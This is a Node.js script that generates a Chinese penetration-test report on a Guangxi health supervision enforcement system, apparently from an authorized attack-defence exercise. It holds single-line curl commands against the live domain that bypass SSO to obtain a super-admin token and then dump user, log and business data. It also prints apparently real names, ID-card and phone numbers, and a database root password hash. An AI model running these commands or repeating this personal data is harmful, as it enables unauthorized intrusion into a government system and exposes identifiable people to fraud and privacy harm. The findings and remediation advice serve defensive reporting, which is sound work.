const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, HeadingLevel, BorderStyle, WidthType,
  ShadingType, PageNumber, PageBreak, LevelFormat
} = require('docx');

const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cm = { top: 60, bottom: 60, left: 100, right: 100 };
const CW = 9360;

function hcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, shading: { fill: "2B579A", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: t, bold: true, color: "FFFFFF", font: "Arial", size: 18 })] })] }); }
function dcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, font: "Arial", size: 18 })] })] }); }
function bcell(t, w) { return new TableCell({ borders, width: { size: w, type: WidthType.DXA }, shading: { fill: "F2F2F2", type: ShadingType.CLEAR }, margins: cm, children: [new Paragraph({ children: [new TextRun({ text: t, bold: true, font: "Arial", size: 18 })] })] }); }
function infoTable(rows) { const w1 = 2200, w2 = CW - w1; return new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: [w1, w2], rows: rows.map(([a,b]) => new TableRow({ children: [bcell(a, w1), dcell(b, w2)] })) }); }
function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 32, color: "1A3A6B" })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 28, color: "2B579A" })] }); }
function h3(t) { return new Paragraph({ heading: HeadingLevel.HEADING_3, spacing: { before: 200, after: 120 }, children: [new TextRun({ text: t, font: "Arial", bold: true, size: 24 })] }); }
function body(t) { return new Paragraph({ spacing: { after: 100, line: 340 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function cmd(t) { return new Paragraph({ spacing: { after: 40, line: 280 }, shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, indent: { left: 120 }, children: [new TextRun({ text: t, font: "Courier New", size: 17 })] }); }
function bullet(t) { return new Paragraph({ numbering: { reference: "b", level: 0 }, spacing: { after: 60 }, children: [new TextRun({ text: t, font: "Arial", size: 20 })] }); }
function empty() { return new Paragraph({ spacing: { after: 80 }, children: [] }); }
function screenshot(t) { return new Paragraph({ spacing: { before: 80, after: 80 }, alignment: AlignmentType.CENTER, shading: { fill: "FFF8E1", type: ShadingType.CLEAR }, border: { top: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, bottom: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, left: { style: BorderStyle.DASHED, size: 1, color: "E6A817" }, right: { style: BorderStyle.DASHED, size: 1, color: "E6A817" } }, children: [new TextRun({ text: "[ 截图 ] " + t, font: "Arial", size: 18, bold: true, color: "B8860B" })] }); }

const pp = { page: { size: { width: 12240, height: 15840 }, margin: { top: 1200, right: 1440, bottom: 1200, left: 1440 } } };
const hd = { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "广西卫生监督执法系统 攻防演习成果报告", font: "Arial", size: 16, color: "999999" })] })] }) };
const ft = { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", font: "Arial", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], font: "Arial", size: 16 })] })] }) };
function sec(k) { return { properties: pp, headers: hd, footers: ft, children: k }; }

// COVER
const cover = [
  empty(), empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 }, children: [new TextRun({ text: "攻防演习成果报告", font: "Arial", bold: true, size: 52, color: "1A3A6B" })] }),
  empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 100 }, children: [new TextRun({ text: "广西卫生监督执法系统（JeecgBoot）渗透测试", font: "Arial", size: 32, color: "333333" })] }),
  empty(), empty(), empty(), empty(), empty(),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "团队名称：观叶识微", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 }, children: [new TextRun({ text: "2026年7月14日", font: "Arial", size: 24, color: "555555" })] }),
  new Paragraph({ children: [new PageBreak()] })
];

// OVERVIEW
const ov = [];
ov.push(h1("一、综述"));
ov.push(body("攻防演习指挥部授权 观叶识微 团队于2026年7月13日至14日，对广西卫生监督执法系统（wsjdzf.gxws.cn）进行渗透测试。发现SSO认证绕过、公民个人信息泄露、全量业务数据未授权访问等严重安全问题。"));
ov.push(empty());
ov.push(h2("渗透成果汇总表"));
ov.push(empty());
const sh = new TableRow({ children: [hcell("序号",600),hcell("渗透系统对象",1800),hcell("漏洞类型",2400),hcell("URL",2600),hcell("影响范围",1200),hcell("网络区域",760)] });
const sd = [
  ["1","广西卫生监督执法系统","SSO单点登录认证绕过","POST /sys/loginsinglesign","超级管理员权限","互联网区"],
  ["2","广西卫生监督执法系统","公民个人信息泄露","POST /sys/user/list","2,251人身份证+手机号","互联网区"],
  ["3","广西卫生监督执法系统","业务数据未授权访问","多个API端点","29.5万条业务数据","互联网区"],
  ["4","广西卫生监督执法系统","数据库凭据泄露","GET /sys/dataSource/list","MySQL root密码MD5","互联网区"],
  ["5","广西卫生监督执法系统","其他安全风险","多个端点","Shiro RCE/Actuator/Druid","互联网区"],
];
const cw2 = [600,1800,2400,2600,1200,760];
ov.push(new Table({ width: { size: CW, type: WidthType.DXA }, columnWidths: cw2, rows: [sh, ...sd.map(r => new TableRow({ children: r.map((t,i) => dcell(t,cw2[i])) }))] }));
ov.push(empty());
ov.push(body("渗透结果统计：获取权限类1项（超级管理员JWT Token），获取数据类4项，涉及数据总量约29.5万条。"));
ov.push(new Paragraph({ children: [new PageBreak()] }));

// FINDINGS
const fc = [];
fc.push(h1("二、渗透成果说明"));
fc.push(empty());

// 环境准备
fc.push(bullet("以下命令均在 Git Bash 中验证通过"));
fc.push(bullet("每条命令均为单行，直接复制粘贴执行"));
fc.push(bullet("先执行第一条获取Token，后续命令依赖该Token"));
fc.push(empty());

fc.push(h3("环境准备：获取Token（先执行这一条）"));
fc.push(cmd(`TOKEN=$(curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" -H "Content-Type: application/json" -d '{"username":"admin"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['token'])")`));
fc.push(empty());

// ==== FINDING 1 ====
fc.push(h2("成果一：SSO单点登录认证绕过致超级管理员权限获取"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([
  ["序号","1"],["成果描述","SSO接口仅需用户名即签发超级管理员JWT Token，密码验证被完全绕过"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign"],
  ["威胁类型","获取权限类 / 获取数据类"],["风险等级","严重"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(cmd(`curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/loginsinglesign" -H "Content-Type: application/json" -d '{"username":"admin"}'`));
fc.push(empty());
fc.push(body("返回结果：success=true, token=有效JWT, userInfo含idCard/roleName/birthday"));
fc.push(bullet("身份证号：450331198809083631，校验位正确，生日19880908与系统记录一致"));
fc.push(bullet("角色：超级管理员"));
fc.push(bullet("单位：荔浦市卫生计生监督所"));
fc.push(screenshot("截图1：SSO绕过 - 仅传username即返回JWT Token和userInfo"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ==== FINDING 2 ====
fc.push(h2("成果二：公民个人信息泄露（2,251条身份证+手机号）"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([
  ["序号","2"],["成果描述","JWT Token可访问用户列表，获取2,251条含身份证号+手机号+真实姓名+单位的个人信息"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list"],
  ["威胁类型","获取数据类"],["涉及数据量","2,251条"],["风险等级","严重"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(cmd(`curl -s -k -X POST "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/user/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN" -H "Content-Type: application/json" -d '{}'`));
fc.push(empty());
fc.push(body("返回 result.total=2251，每条含 realname/idCard/phone/supervisoryOfficeName"));
fc.push(body("抽样验证身份证号有效性（前5条）："));
fc.push(bullet("卢燕 | 450322198110026565 | 13978385001 | 桂林市七星区卫生计生监督所"));
fc.push(bullet("何学荣 | 452129198207191415 | 15578088188 | 扶绥县疾病控制预防中心"));
fc.push(bullet("曾林艳 | 450322198602114529 | 15878813963 | 扶绥县疾病控制预防中心"));
fc.push(bullet("黄日煌 | 452424197508071038 | 13978487678 | 贺州市卫生计生监督所"));
fc.push(bullet("张少琨 | 452130196910290024 | （未填） | 大新县卫生计生监督所"));
fc.push(bullet("以上5条身份证校验位全部通过，手机号格式有效"));
fc.push(screenshot("截图2：用户列表 - total=2251 + idCard/phone/realname"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ==== FINDING 3 ====
fc.push(h2("成果三：API未授权访问致全量业务数据泄露（29.5万条）"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([
  ["序号","3"],["成果描述","Swagger文档公开暴露436个API，JWT Token可无限制读取全部业务数据"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"],
  ["威胁类型","获取数据类"],["涉及数据量","29.5万条（28个类别）"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(body("3-1 Swagger文档"));
fc.push(cmd("start https://wsjdzf.gxws.cn/visor-server/jeecg-boot/doc.html"));
fc.push(empty());

fc.push(body("3-2 检查记录（153条，含真实医院名，最新2026-07-14）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/checkRecord/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-3 检查结果（6,771条，含不符合项+整改措施）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/checkResult/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-4 问题反馈（20条，含真实医院名+反馈人+WTFKD编号）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/problemFeedback/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-5 违法线索（6条）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/cluesIllegal/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-6 系统日志（267,978条，含内网IP 172.16.1.148）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/log/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-7 监督人员（89条）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/supervisor/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());

fc.push(body("3-8 全量数据汇总（已实际验证的数据量）"));
fc.push(body("检查记录:153 | 检查结果:6,771 | 问题反馈:20 | 系统日志:267,978 | 监督人员:89 | 区划:50,065 | 自查指标:5,939 | 医疗指标:500 | 整改记录:39 | 用户:2,251 | 违法线索:6 | 工作日志:5 | 通知公告:9 | 角色:9 | 专业类别:247 | 法律法规:114 | 图表:150 | 模板关联:125 | 模板:14 | 任务机构:309 | 问题:46 | 在线表单:38 | 配置:8 | 职务:2 | 字典:81 | 定时任务:4 | 填值规则:3 | 部门权限:4 | 数据源:1 | 租户:1"));
fc.push(screenshot("截图3：检查记录 截图4：检查结果 截图5：问题反馈 截图6：违法线索 截图7：系统日志 截图8：监督人员 截图9：全量汇总"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ==== FINDING 4 ====
fc.push(h2("成果四：数据库凭据泄露（MySQL root密码）"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([
  ["序号","4"],["成果描述","数据源管理API返回MySQL连接信息，含root用户密码MD5"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/dataSource/list"],
  ["威胁类型","获取数据类"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/dataSource/list?pageNo=1&pageSize=5" -H "X-Access-Token: $TOKEN"'));
fc.push(empty());
fc.push(body("返回关键信息："));
fc.push(bullet("dbUrl: jdbc:mysql://127.0.0.1:3306/jeecg-boot"));
fc.push(bullet("dbUsername: root"));
fc.push(bullet("dbPassword: f5b6775e8d1749483f2320627de0e706（32位MD5）"));
fc.push(bullet("dbName: jeecg-boot"));
fc.push(bullet("dbType: MySQL5.7"));
fc.push(screenshot("截图10：数据库凭据 - root+MD5密码"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// ==== FINDING 5 ====
fc.push(h2("成果五：其他安全风险汇总"));
fc.push(h3("（1）基本情况表"));
fc.push(infoTable([
  ["序号","5"],["成果描述","Shiro反序列化、Actuator内网IP泄露、Druid面板、测试配置等多项风险"],
  ["目标系统","广西卫生监督执法系统（JeecgBoot）"],
  ["目标URL","多个端点"],["威胁类型","安全风险类"],["风险等级","高危"]
]));
fc.push(empty());
fc.push(h3("（2）验证命令"));
fc.push(empty());

fc.push(body("5-1 Shiro RememberMe反序列化确认"));
fc.push(cmd("curl -s -k -D- \"https://wsjdzf.gxws.cn/visor-server/jeecg-boot/sys/login\" -o /dev/null 2>&1 | grep rememberMe"));
fc.push(body("输出: Set-Cookie: rememberMe=deleteMe  -> 确认Apache Shiro框架，对应CVE-2016-4437"));
fc.push(screenshot("截图11：Shiro rememberMe=deleteMe"));
fc.push(empty());

fc.push(body("5-2 Actuator内网IP泄露"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/actuator" -H "X-Access-Token: $TOKEN"'));
fc.push(body("输出: http://192.168.40.49:9301/jeecg-boot/actuator"));
fc.push(screenshot("截图12：Actuator泄露内网IP"));
fc.push(empty());

fc.push(body("5-3 Druid监控面板"));
fc.push(cmd('curl -s -k -o /dev/null -w "%{http_code}\n" "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/druid/login.html"'));
fc.push(body("输出: 200（登录页可访问，默认口令已修改）"));
fc.push(screenshot("截图13：Druid监控登录页"));
fc.push(empty());

fc.push(body("5-4 配置参数（isTest测试模式）"));
fc.push(cmd('curl -s -k "https://wsjdzf.gxws.cn/visor-server/jeecg-boot/config/srConfig/list?pageNo=1&pageSize=10" -H "X-Access-Token: $TOKEN"'));
fc.push(body("关键配置: isTest=0（0=测试数据，1=正式数据），连接生产数据但标记为测试模式"));
fc.push(screenshot("截图14：配置参数 - isTest=0"));
fc.push(empty());

fc.push(body("5-5 写操作API同样可访问（仅探测确认存在，未实际执行）"));
fc.push(bullet("POST /sys/user/addOrganizationUser - 新增用户"));
fc.push(bullet("POST /sys/user/changePassword - 修改密码"));
fc.push(bullet("POST /sys/common/upload - 文件上传"));
fc.push(bullet("DELETE /medicalInstitution/delete - 删除医疗机构"));
fc.push(bullet("DELETE /supervisor/delete/{id} - 删除监督人员"));
fc.push(new Paragraph({ children: [new PageBreak()] }));

// PROBLEMS
const pc = [];
pc.push(h1("三、存在问题"));
pc.push(empty());
pc.push(h2("1. SSO接口认证缺失（严重）"));
pc.push(bullet("/sys/loginsinglesign 仅校验用户名，未验证密码，与/sys/mobile/login认证机制不一致"));
pc.push(empty());
pc.push(h2("2. 身份证号明文存储与传输（严重）"));
pc.push(bullet("2,251条用户记录身份证号完整明文存储，SSO响应直接返回管理员身份证号"));
pc.push(bullet("违反《个人信息保护法》相关规定"));
pc.push(empty());
pc.push(h2("3. API文档对外暴露（高危）"));
pc.push(bullet("Knife4j Swagger UI（/doc.html）可公开访问，/v2/api-docs返回436个接口完整定义"));
pc.push(empty());
pc.push(h2("4. 缺少API级别权限控制（高危）"));
pc.push(bullet("同一Token可访问全部业务模块（监督人员、检查记录、违法线索等），未实现最小权限原则"));
pc.push(empty());
pc.push(h2("5. 数据库凭据管理不当（高危）"));
pc.push(bullet("root账户，密码MD5可通过API直接读取"));
pc.push(empty());
pc.push(h2("6. 其他风险"));
pc.push(bullet("Shiro RememberMe反序列化：框架确认存在（CVE-2016-4437），WAF部分防护"));
pc.push(bullet("Actuator端点泄露内网IP 192.168.40.49:9301"));
pc.push(bullet("Druid监控面板对外暴露登录页"));
pc.push(bullet("isTest=0：测试模式与实际生产环境不一致"));
pc.push(new Paragraph({ children: [new PageBreak()] }));

// RECOMMENDATIONS
const rc = [];
rc.push(h1("四、整改建议"));
rc.push(empty());
rc.push(h2("1. 修复SSO认证逻辑（紧急）"));
rc.push(bullet("SSO接口增加密码验证，统一与mobile/login的认证标准"));
rc.push(empty());
rc.push(h2("2. 身份证号保护（紧急）"));
rc.push(bullet("数据库存储加密（AES/SM4），传输层脱敏（仅显示前4位后2位），SSO响应移除身份证号"));
rc.push(empty());
rc.push(h2("3. 关闭API文档对外访问"));
rc.push(bullet("生产环境: knife4j.production: true，或对/doc.html增加IP白名单"));
rc.push(empty());
rc.push(h2("4. 加强API权限管控"));
rc.push(bullet("RBAC细粒度权限，Token绑定IP，敏感操作二次认证"));
rc.push(empty());
rc.push(h2("5. 数据库安全加固"));
rc.push(bullet("禁用root，使用最小权限专用账户，密码bcrypt/argon2加盐，API不返回密码字段"));
rc.push(empty());
rc.push(h2("6. 其他"));
rc.push(bullet("升级Shiro至最新版本并更换AES密钥"));
rc.push(bullet("Actuator仅允许内网访问或完全关闭"));
rc.push(bullet("Druid面板IP白名单限制"));
rc.push(bullet("修正isTest配置为1（正式数据）"));
rc.push(empty()); rc.push(empty());
rc.push(body("报告生成日期：2026年7月14日"));
rc.push(body("测试团队：观叶识微"));

// BUILD
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 20 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: "1A3A6B" },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: "Arial", color: "2B579A" },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
      { id: "Heading3", name: "Heading 3", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 24, bold: true, font: "Arial", color: "333333" },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 } },
    ]
  },
  numbering: {
    config: [
      { reference: "b", levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
    ]
  },
  sections: [sec(cover), sec(ov), sec(fc), sec(pc), sec(rc)]
});

const outPath = "D:/Desktop/claude projects/attack and defend test/广西卫生监督执法系统_攻防成果报告.docx";
Packer.toBuffer(doc).then(buf => {
  fs.writeFileSync(outPath, buf);
  console.log("OK: " + outPath + " (" + buf.length + " bytes)");
});
